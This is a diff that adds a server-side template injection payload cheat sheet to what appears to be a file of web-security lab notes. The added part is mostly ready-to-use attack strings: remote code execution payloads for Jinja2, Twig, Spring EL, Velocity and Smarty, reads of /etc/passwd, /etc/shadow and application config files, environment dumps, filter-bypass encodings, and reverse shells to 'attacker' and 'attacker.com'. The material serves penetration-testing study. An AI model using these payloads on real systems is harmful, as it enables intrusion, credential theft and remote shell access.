@@ -1,3 +1,213 @@
+
+# **✅ Server-Side Template Injection (SSTI) – Complete Test Case (with Bypass Cases)**
+```
+1.1 Basic SSTI Expression Injection
+1.2 Sandbox Escape in Template Engines
+1.3 Arbitrary Code Execution (RCE)
+1.4 File Read via Template Functions
+1.5 Server-Side Variable Manipulation
+1.6 Template Logic Abuse (Loops, Conditions)
+1.7 Bypass of Filtered Template Syntax
+1.8 Chaining SSTI → LFI → RCE
+1.9 HTML Injection → SSTI (Context Breakout)
+1.10 Framework-Specific Template Engine Exploits (Jinja2, Twig, Freemarker)
+```
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Normal structure — non-weaponized education payloads)*
+
+```
+2.1 Basic Injection Test
+{{7*7}}
+```
+
+```
+2.2 Alternative Syntax Injection
+${7*7}
+```
+
+```
+2.3 Jinja2 Variable Leak
+{{ config }}
+```
+
+```
+2.4 Twig Debug Variable Access
+{{ dump() }}
+```
+
+```
+2.5 JSP / Expression Language (EL)
+${'SSTI'}
+```
+
+```
+2.6 Template Logic Injection
+{{ ["S","S","T","I"]|join("") }}
+```
+
+```
+2.7 Expression-Based Testing
+{{ 1+2 }}
+```
+
+```
+2.8 PHP Smarty Test
+{$smarty.version}
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Payloads for Learning)**
+
+*(Real offensive payloads used for exploitation)*
+
+```
+3.1 Jinja2 RCE Payload
+{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
+```
+
+```
+3.2 Remote Command Execution (Jinja2)
+{{ cycler.__init__.__globals__.os.popen("id").read() }}
+```
+
+```
+3.3 JVM / Spring EL RCE
+${T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+```
+3.4 Tornado SSTI → File Read
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read() }}
+```
+
+```
+3.5 Twig RCE via Sandbox Escape
+{{ _self.env.registerUndefinedFilterCallback("system") }}{{ 'id'|system }}
+```
+
+```
+3.6 Python SSTI → Reverse Shell
+{{ cycler.__init__.__globals__.os.system("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'") }}
+```
+
+```
+3.7 PHP Smarty RCE
+{$smarty.template_object->smarty->security_policy->php_handling = 2}
+```
+
+```
+3.8 Handlebars Prototype Pollution → RCE
+{{#with "constructor"}}{{#with "constructor"}}{{lookup this "global"}}{{/with}}{{/with}}
+```
+
+```
+3.9 Mustache Escape to JS RCE
+{{#payload}}<img src=x onerror=alert(1)>{{/payload}}
+```
+
+```
+3.10 Velocity Template Engine RCE
+#set($x="".getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+```
+
+---
+
+# **4. Bypass Techniques (Filter Bypass, Syntax Obfuscation, WAF Evasion)**
+
+```
+4.1 Whitespace Bypass
+{{7 * 7}}
+```
+
+```
+4.2 Mixed Bracket Bypass
+{ { 7*7 } }
+```
+
+```
+4.3 URL Encoded SSTI
+%7B%7B7*7%7D%7D
+```
+
+```
+4.4 Double-Encoded SSTI
+%257B%257B7*7%257D%257D
+```
+
+```
+4.5 Comment-Injection to Bypass Filtering
+{{7*7}}{#comment#}
+```
+
+```
+4.6 Inline Function Bypass
+${{7*7}}
+```
+
+```
+4.7 Breaking Out of HTML Context
+">{{7*7}}
+```
+
+```
+4.8 Indirect Access to Globals
+{{ [].__class__.__mro__[1].__subclasses__() }}
+```
+
+```
+4.9 Dotless Global Access (Jinja2 Filter Abuse)
+{{ request|attr("__class__")|attr("__mro__") }}
+```
+
+```
+4.10 SSTI via Hidden Fields/JSON Keys
+"template": "{{7*7}}"
+```
+
+---
+
+# **5. Advanced Attack Chains (Real-World Exploitation)**
+
+```
+5.1 SSTI → File Read → Credential Theft
+{{ cycler.__init__.__globals__.open('/var/www/app/config.yaml').read() }}
+```
+
+```
+5.2 SSTI → Code Execution → Reverse Shell
+{{ self.__init__.__globals__.os.system('nc attacker.com 4444 -e /bin/bash') }}
+```
+
+```
+5.3 SSTI → Dump Environment Variables
+{{ cycler.__init__.__globals__.os.environ }}
+```
+
+```
+5.4 SSTI → Privilege Escalation
+{{ ''.__class__.__mro__[1].__subclasses__()[150]()._module.__builtins__.open('/root/root.txt').read() }}
+```
+
+```
+5.5 SSTI → Access Template Source Code
+{{ self.__init__.__globals__.__file__ }}
+```
+
+```
+5.6 SSTI → Database Read (via injected Python)
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/mysql/my.cnf').read() }}
+```
+
+```
+5.7 SSTI → Internal Network Scan
+{{ cycler.__init__.__globals__.os.popen("ping -c 1 127.0.0.1").read() }}
+```
+
 01 Basic server-side template injection
 =======================================
 
@@ -571,4 +781,5 @@ The solution is directly in https://book.hacktricks.xyz/pentesting-web/ssti-serv
 
 
 ![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/9.png)
+
 
